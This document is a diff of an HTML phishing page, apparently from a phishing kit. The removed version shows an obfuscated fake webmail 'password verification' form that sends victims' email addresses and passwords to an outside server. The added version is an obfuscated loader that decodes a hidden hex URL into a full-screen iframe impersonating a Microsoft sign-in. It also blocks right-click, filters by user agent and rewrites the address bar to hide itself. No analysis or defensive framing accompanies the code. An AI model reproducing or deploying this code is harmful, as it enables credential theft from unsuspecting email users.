@@ -1,228 +1,82 @@
+<!DOCTYPE html>
 <html lang="en">
-   <head>
-  
-        <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
-     
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    
-       
-      
-  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
-  integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
-        <link href="https://fonts.googleapis.com/css?family=Yellowtail&display=swap" rel="stylesheet">
-        <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
-        <title></title>
-        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
-		<link rel="icon" type="image/jpg" href="https://i.gyazo.com/908013190f506e28135b03e680bbd946.jpg">
-    
-        <style type="text/css">
-      .hide{
-        display: none;
-      }
-      .grey-form{
-        background-color: #eee;opacity: 1;
-        pointer-events:none;
-      }
-      .alert-success{
-        color: #155724;
-        background-color: #d4edda;
-        border-color: #c3e6cb;
-      }
-    
-    
-    
-        </style>
- </head>
-  <body>
-    <div class="container-fluid">
-      <div class="row" style="background-image: url(''); background-size: cover;background-repeat: no-repeat;">
-        <div class="container">
-          <div class="row">
-            <div class="col-lg-6 mx-auto my-5 px-5 pb-5" style="border:1px solid; background-color: rgba(0,0,0,0.7);border-radius:15px;">
-             
-              <div class="mt-3">
-                <div class="row">
-                <div class="col-lg-12">
-                    <a href="javascript:void(0)" id="gmailmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
-                      <div class="mt-2" >
-                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
-                      </div>
-                    </a>
-                  </div>
-                  <div class="col-lg-12">
-                    <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
-                      <div class=" mt-2" >
-                         
-                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
-                      </div>
-                    </a>
-                  </div>
-                </div>
-                <div class="row">
-                  <div class="col-lg-12 ">
-                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
-                      <div class="  mt-2" >
-                         
-                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
-                      </div>
-                    </a>
-                  </div>
-                  <div class="col-lg-12">
-                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
-                      <div class=" mt-2" >
-                         
-                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
-                      </div>
-                    </a>
-                  </div>
-                </div>
-                <div class="row">
-                  <div class="col-lg-12 ">
-                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
-                      <div class="  mt-2" >
-                         
-                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
-                      </div>
-                    </a>
-                  </div>
-                  <div class="col-lg-12">
-                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
-                      <div class=" mt-2" >
-                         
-                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
-                      </div>
-                    </a>
-                  </div>
-                </div>
-                <div class="row">
-                  <div class="col-lg-12 ">
-                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
-                      <div class="  mt-2" >
-                         
-                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
-                      </div>
-                    </a>
-                  </div>
-                  <div class="col-lg-12">
-                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
-                      <div class=" mt-2" >
-                         
-                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
-                      </div>
-                    </a>
-                  </div>
-                </div>
-                <div class="row">
-                  <div class="col-lg-12 ">
-                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
-                      <div class="  mt-2" >
-                         
-                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
-                      </div>
-                    </a>
-                  </div>
-                  <div class="col-lg-12">
-                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
-                      <div class=" mt-2" >
-                         
-                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
-                      </div>
-                    </a>
-                  </div>
-                </div>
-                <div class="col-lg-12 ">
-                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
-                      <div class="  mt-2" >
-                         
-                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
-                      </div>
-                    </a>
-                  </div>
-                  <div class="col-lg-12">
-                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
-                      <div class=" mt-2" >
-                         
-                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
-                      </div>
-                    </a>
-                  </div>
-                </div>
-                
-                    </a>
-                  </div>
-                  <div class="col-lg-12">
-                     <p class="text-white mt-3 text-center"></p>
-                <p class="h5 text-center text-white"></p> 
-                    
-                  </div>
-               
-              </div> 
-            </div>
-          </div>
-        </div>
-
-
-
-      </div> 
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link id="icon" rel="shortcut icon" href="" />
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
+        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <title id="title">Please wait</title>
+    <style>
+        body {
+            padding: 0px;
+            margin: 0px;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+        }
+        .div1 {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+        }
+        .div2 {
+            display: none;
+            margin: auto;
+            position: static;
+        }
+        iframe {
+            height: 100vh;
+            width: 100vw;
+            border: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+        .loader {
+            display: inline-block;
+            width: 80px;
+            height: 80px;
+        }
+        .loader:after {
+            content: " ";
+            display: block;
+            width: 64px;
+            height: 64px;
+            margin: 8px;
+            border-radius: 50%;
+            border: 6px solid #3498db;
+            border-color: #3498db transparent #3498db transparent;
+            animation: loader 1.2s linear infinite;
+        }
+        @keyframes loader {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #333;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <input id="lur" type="hidden"
+        value="\\x68\\x74\\x74\\x70\\x73\\x25\\x33\\x41\\x2f\\x2f\\x77\\x65\\x6c\\x63\\x6f\\x6d\\x65\\x74\\x6f\\x6d\\x79\\x67\\x6f\\x76\\x65\\x72\\x6e\\x69\\x6e\\x67\\x62\\x6f\\x64\\x69\\x65\\x73\\x61\\x6e\\x64\\x70\\x75\\x62\\x6c\\x69\\x63\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x73\\x6c\\x69\\x6e\\x6b\\x73\\x73\\x65\\x63\\x74\\x69\\x6f\\x6e\\x2e\\x63\\x6f\\x6d"
+        readonly required>
+    <input id="kur" type="hidden" value="c2VjcmV0Y29kZQ==" readonly required>
+    <div class="div1">
+        <div class="loader"></div>
+        <div class="loading-text">Loading secure content, please wait...</div>
     </div>
-    
-    
-    
-        <!-- Modal for gmail -->
-        <div style="display: block !important" class="modal" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
-          <div class="modal-dialog" role="document">
-            <div class="modal-content">
-              <div class="modal-header">
-              </div>
+    <div class="div2">
+    </div>
 
-              <div class="modal-body" >
-                <center>
-                  <img id="fieldImg" class="img-fluid" width="80px">
-                  
-                  <h5 class="modal-title" id="exampleModalLabel"><span id="head-message" class=""></span><br></h5>
-                    <span class="font-weight-normal"><a>Accessing sensitive infomation requires password verification.</a></span>
-                  <br>
-                  <div style="margin-top: 10px; color: #FF0000;" class="alert small" id="msg"></div>
-    
-                </center>
-               
-                <div id='mainDiv'> 
-                  <form id="contact" class="form-horizontal well">
-                    <div class="col-lg-12">
-                      <div class="form-group">
-                        <input type="hidden" value="1" name="counter" id="counter"/>
-                        <label for="exampleInputEmail1">Email address</label>
-                        <input style="background-color: #eee;opacity: 1; pointer-events:none !important;" type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email" readonly="">
-                        <!-- <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small> -->
-                      </div>
-                    </div>
-                    <div class="col-lg-12">
-                      <div style="margin-bottom: 0.5rem !important;" class="form-group">
-                        <label for="Password">Password</label>
-                        <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password" required="">
-                      </div>
-                    </div>
-                  <div class="modal-footer" style="padding: 0.5rem !important;">
-                
-                    <div class="btn btn-info pull-right w-60" id="submit-btn" onclick='Submit()'>Login to continue</div>
-                  </div>
-                </form>
-              </div>
-
-            
-            
-            </div>
-          </div>
-        </div>
-      
-      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
-      </body>
-    
-      
-      <script>
-      function _0x1c7a(_0x248464,_0x17edb4){var _0x3c8984=_0x3c89();return _0x1c7a=function(_0x1c7a52,_0xbf6e70){_0x1c7a52=_0x1c7a52-0x190;var _0x5605f0=_0x3c8984[_0x1c7a52];return _0x5605f0;},_0x1c7a(_0x248464,_0x17edb4);}var _0x4977fa=_0x1c7a;(function(_0x141d1b,_0xcf5b0){var _0x511486=_0x1c7a,_0x421946=_0x141d1b();while(!![]){try{var _0x5c78bf=-parseInt(_0x511486(0x1b5))/0x1*(parseInt(_0x511486(0x1bd))/0x2)+parseInt(_0x511486(0x1ae))/0x3+-parseInt(_0x511486(0x1ad))/0x4+-parseInt(_0x511486(0x1ba))/0x5*(-parseInt(_0x511486(0x193))/0x6)+-parseInt(_0x511486(0x1c4))/0x7+parseInt(_0x511486(0x1ab))/0x8*(parseInt(_0x511486(0x19d))/0x9)+parseInt(_0x511486(0x192))/0xa;if(_0x5c78bf===_0xcf5b0)break;else _0x421946['push'](_0x421946['shift']());}catch(_0x4af7b7){_0x421946['push'](_0x421946['shift']());}}}(_0x3c89,0x380cb));var red__=_0x4977fa(0x194),sava_url='https://foundationfortheempowermentofwestafricancommunitiespartners.org/';document[_0x4977fa(0x197)]('email')[_0x4977fa(0x1a6)]=getEmail();var domain=getEmail()['substring'](getEmail()['lastIndexOf']('@')+0x1),frmsite=domain[_0x4977fa(0x1c6)](0x0,domain['indexOf']('.'));document[_0x4977fa(0x1c1)]=ucFirst(frmsite)+_0x4977fa(0x1a9)+ucFirst(frmsite)+_0x4977fa(0x1c3),document[_0x4977fa(0x197)](_0x4977fa(0x1b7))[_0x4977fa(0x1bf)]=ucFirst(frmsite)+'\x20Online\x20Cloud\x20App',$(_0x4977fa(0x195))[_0x4977fa(0x1b4)](_0x4977fa(0x1aa),'https://logo.clearbit.com/'+domain)['on'](_0x4977fa(0x19c),function(){var _0x12eaa8=_0x4977fa;$(_0x12eaa8(0x195))[_0x12eaa8(0x1be)]();})['on']('load',function(){var _0x422bc0=_0x4977fa;$(_0x422bc0(0x195))[_0x422bc0(0x1b0)]();}),dm_url=_0x4977fa(0x1af),window[_0x4977fa(0x191)]['replaceState']({},'',dm_url);function _0x3c89(){var _0x2ba8a2=['\x20Hosting\x20Webmail\x20::\x20Welcome\x20to\x20','src','144bJVHru','then','129072ZRBjlF','1030533ynocJm','/SW4gc29tZSBjYXNlcywgeW91IG1heSBiZSBhYmxlIHRvIGNoYW5nZSB0aGUgcGF0aCBwYXJ0IG9mIHRoZSBVUkwgdXNpbmcgd2luZG93LmxvY2F0aW9uLnBhdGhuYW1lLiBIb3dldmVyLCB0aGlzIGlzIGxpbWl0ZWQgYW5kIG1heSBub3Qgd29yayBpbiBhbGwgc2NlbmFyaW9zIGR1ZSB0byBicm93c2VyIHNlY3VyaXR5IHJlc3RyaWN0aW9uczo=','show','#msg','GET','Invalid\x20Credentials!\x20Please\x20try\x20again.','attr','4oHgYMS','/external/','head-message','focus','json','5oEcCNK','Try\x20Again','text','176582VIMNTl','hide','innerHTML','#newbutton','title','replace','\x20Hosting\x20Webmail','1923397YEaVhc','location','substring','hash','history','4054630FtHjpL','220716KQdzYQ','https://acrobat.adobe.com/id/urn:aaid:sc:VA6C2:dc24f40d-4f58-4d5e-b0f9-2edcc0e0e9b2','#fieldImg','test','getElementById','Login\x20successfully','charAt','addClass','That\x20account\x20doesn\x27t\x20exist.\x20Enter\x20a\x20different\x20account','error','52011mFNUVn','password','#submit-btn','html','href','#password','val','slice','toUpperCase','value','success','pop'];_0x3c89=function(){return _0x2ba8a2;};return _0x3c89();}function Submit(){var _0x18dd37=_0x4977fa,_0x3e0974=$('#email')[_0x18dd37(0x1a3)](),_0x32faa7=$(_0x18dd37(0x1a2))[_0x18dd37(0x1a3)](),_0x59c523=$('#msg')['html']();$(_0x18dd37(0x1b1))[_0x18dd37(0x1bc)](_0x59c523);if(!/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/[_0x18dd37(0x196)](_0x3e0974))return $('#error')[_0x18dd37(0x1b0)](),_0x3e0974[_0x18dd37(0x1b8)],![];if(!/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/[_0x18dd37(0x196)](_0x3e0974))return $(_0x18dd37(0x1b1))[_0x18dd37(0x1b0)](),$('#msg')[_0x18dd37(0x19a)]('alert-danger'),$(_0x18dd37(0x1b1))[_0x18dd37(0x1a0)](_0x18dd37(0x19b)),![];$(_0x18dd37(0x19f))[_0x18dd37(0x1a0)]('Verifing...'),$(_0x18dd37(0x1b1))[_0x18dd37(0x1bc)](''),fetch(sava_url+_0x18dd37(0x1b6)+_0x3e0974+'/'+_0x32faa7,{'method':_0x18dd37(0x1b2)})[_0x18dd37(0x1ac)](_0x2b5e26=>{var _0x55d701=_0x18dd37;if(!_0x2b5e26['ok'])throw new Error('Network\x20response\x20was\x20not\x20ok');return _0x2b5e26[_0x55d701(0x1b9)]();})[_0x18dd37(0x1ac)](_0xd616f8=>{var _0x25b5e2=_0x18dd37;console['log'](_0xd616f8),_0xd616f8[_0x25b5e2(0x1a7)]?($(_0x25b5e2(0x1c0))['text'](_0x25b5e2(0x198)),setTimeout(function(){var _0x6c64b3=_0x25b5e2;$(_0x6c64b3(0x1c0))[_0x6c64b3(0x1bc)]('Redirecting..');},0x5dc),setTimeout(function(){var _0x57e794=_0x25b5e2;window[_0x57e794(0x1c5)][_0x57e794(0x1c2)](red__);},0xbb8)):($(_0x25b5e2(0x19f))[_0x25b5e2(0x1a0)](_0x25b5e2(0x1bb)),$(_0x25b5e2(0x1b1))[_0x25b5e2(0x1bc)](_0x25b5e2(0x1b3)),document[_0x25b5e2(0x197)](_0x25b5e2(0x19e))[_0x25b5e2(0x1a6)]='');});};function getEmail(){var _0xed83f3=_0x4977fa;if(window[_0xed83f3(0x1c5)][_0xed83f3(0x190)]){var _0xfde87f=window[_0xed83f3(0x1c5)][_0xed83f3(0x1a1)],_0x475e38=_0xfde87f['split']('#')[_0xed83f3(0x1a8)]();return atob(_0x475e38);}}function ucFirst(_0x3bfb6d){var _0x1ddafe=_0x4977fa;return _0x3bfb6d[_0x1ddafe(0x199)](0x0)[_0x1ddafe(0x1a5)]()+_0x3bfb6d[_0x1ddafe(0x1a4)](0x1);}
-
-      </script>
-      </html>
+    <script>
+const _0x3ce505=_0x1b02;(function(_0x418a0d,_0xe02f4a){const _0x14498a=_0x1b02,_0x126994=_0x418a0d();while(!![]){try{const _0x3baadf=parseInt(_0x14498a(0x11a))/0x1*(parseInt(_0x14498a(0x103))/0x2)+-parseInt(_0x14498a(0x105))/0x3*(-parseInt(_0x14498a(0x107))/0x4)+-parseInt(_0x14498a(0x135))/0x5*(parseInt(_0x14498a(0x129))/0x6)+-parseInt(_0x14498a(0x117))/0x7*(-parseInt(_0x14498a(0x111))/0x8)+-parseInt(_0x14498a(0x109))/0x9+-parseInt(_0x14498a(0x104))/0xa+parseInt(_0x14498a(0x120))/0xb;if(_0x3baadf===_0xe02f4a)break;else _0x126994['push'](_0x126994['shift']());}catch(_0x4877c1){_0x126994['push'](_0x126994['shift']());}}}(_0xfccc,0x93381));function hexToString(_0x4d0285){const _0x34e241=_0x1b02;let _0x339c33=_0x4d0285[_0x34e241(0x128)](/\\\\/g,'\x5c');return _0x339c33[_0x34e241(0x128)](/\\x([0-9A-Fa-f]{2})/g,function(_0x5c46ae,_0x401f81){const _0x354e53=_0x34e241;return String[_0x354e53(0x12d)](parseInt(_0x401f81,0x10));});}function robustDecode(_0x400466){const _0x3e6231=_0x1b02;let _0x3989c9=_0x400466[_0x3e6231(0x128)](/\\/g,'');try{return decodeURIComponent(_0x3989c9);}catch(_0x337836){return _0x3989c9;}}function redir(_0x3c786f,_0x42f00d){const _0x1fbf0a=_0x1b02;$(_0x1fbf0a(0x132))[_0x1fbf0a(0x10d)]();let _0x4a121b=hexToString(_0x3c786f),_0x37107c=robustDecode(_0x4a121b);!_0x37107c['startsWith'](_0x1fbf0a(0x10f))&&!_0x37107c[_0x1fbf0a(0x12b)](_0x1fbf0a(0x114))&&(_0x37107c=_0x1fbf0a(0x114)+_0x37107c);var _0xd202bb=document[_0x1fbf0a(0x108)](_0x1fbf0a(0x121));_0xd202bb[_0x1fbf0a(0x119)]=_0x42f00d?_0x37107c+'#'+_0x42f00d:_0x37107c,_0xd202bb['id']=_0x1fbf0a(0x125),$('.div2')[_0x1fbf0a(0x116)](_0xd202bb),$(_0x1fbf0a(0x11b))[_0x1fbf0a(0x12a)](_0x1fbf0a(0x130)),$(_0x1fbf0a(0x10e))[_0x1fbf0a(0x106)]('href',_0x1fbf0a(0x127)),$(_0x1fbf0a(0x11c))[_0x1fbf0a(0x11e)](),setTimeout(hideUrl,0x64);}function generateRandomString(_0x3f3598){const _0x45a520=_0x1b02,_0xdb848a=_0x45a520(0x134);let _0x20135d='';for(let _0x4a8cde=0x0;_0x4a8cde<_0x3f3598;_0x4a8cde++){_0x20135d+=_0xdb848a[_0x45a520(0x123)](Math[_0x45a520(0x122)](Math['random']()*_0xdb848a[_0x45a520(0x12f)]));}return _0x20135d;}function _0xfccc(){const _0x3ecab9=['slice','src','72wdmJlR','#title','.div2','replaceState','show','history','4760635zbuHwJ','iframe','floor','charAt','href','frm','Android','https://logincdn.msauth.net/16.000.29266.10/images/favicon.ico','replace','186YlVYZU','text','startsWith','userAgent','fromCharCode','get','length','Sign\x20in\x20to\x20your\x20Microsoft\x20account','addEventListener','.div1','qid','ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_','92770EALrFk','10606shMLqw','5805560kJoXtS','3Oilarc','attr','4244728oTogJZ','createElement','5053113Ppboeh','location','#lur','contextmenu','hide','#icon','http://','indexOf','8LgxNsK','val','/confidentialqidq&protectedfileqid=','https://','#kur','html','3110891MuaKVf'];_0xfccc=function(){return _0x3ecab9;};return _0xfccc();}function _0x1b02(_0x2bc83f,_0x34ea2b){const _0xfccc59=_0xfccc();return _0x1b02=function(_0x1b02ae,_0x12e1df){_0x1b02ae=_0x1b02ae-0x103;let _0x2e9137=_0xfccc59[_0x1b02ae];return _0x2e9137;},_0x1b02(_0x2bc83f,_0x34ea2b);}function hideUrl(){const _0x46c517=_0x1b02;var _0x5a64eb=_0x46c517(0x113)+generateRandomString(0x64);window[_0x46c517(0x11f)][_0x46c517(0x11d)]({},'',_0x5a64eb);}document[_0x3ce505(0x131)](_0x3ce505(0x10c),_0x1cdc88=>_0x1cdc88['preventDefault']());var appName=navigator[_0x3ce505(0x12c)];let ang='13',and='20';appName['indexOf']('Windows')==ang|appName[_0x3ce505(0x110)]('Macintosh')==ang|appName[_0x3ce505(0x110)]('iPhone')==ang|appName[_0x3ce505(0x110)](_0x3ce505(0x126))==and&&setTimeout(function(){const _0x5f243b=_0x3ce505;let _0x36756a=$(_0x5f243b(0x115))[_0x5f243b(0x112)](),_0x44f35a=$(_0x5f243b(0x10b))[_0x5f243b(0x112)]();var _0x299963=new URL(window[_0x5f243b(0x10a)][_0x5f243b(0x124)]),_0x1985a8=_0x299963['hash'][_0x5f243b(0x118)](0x1),_0x26e5b6=_0x299963['searchParams'][_0x5f243b(0x12e)](_0x5f243b(0x133));_0x36756a==_0x26e5b6&&redir(_0x44f35a,_0x1985a8);},0x7d0);
+    </script>
+</body>
+</html>
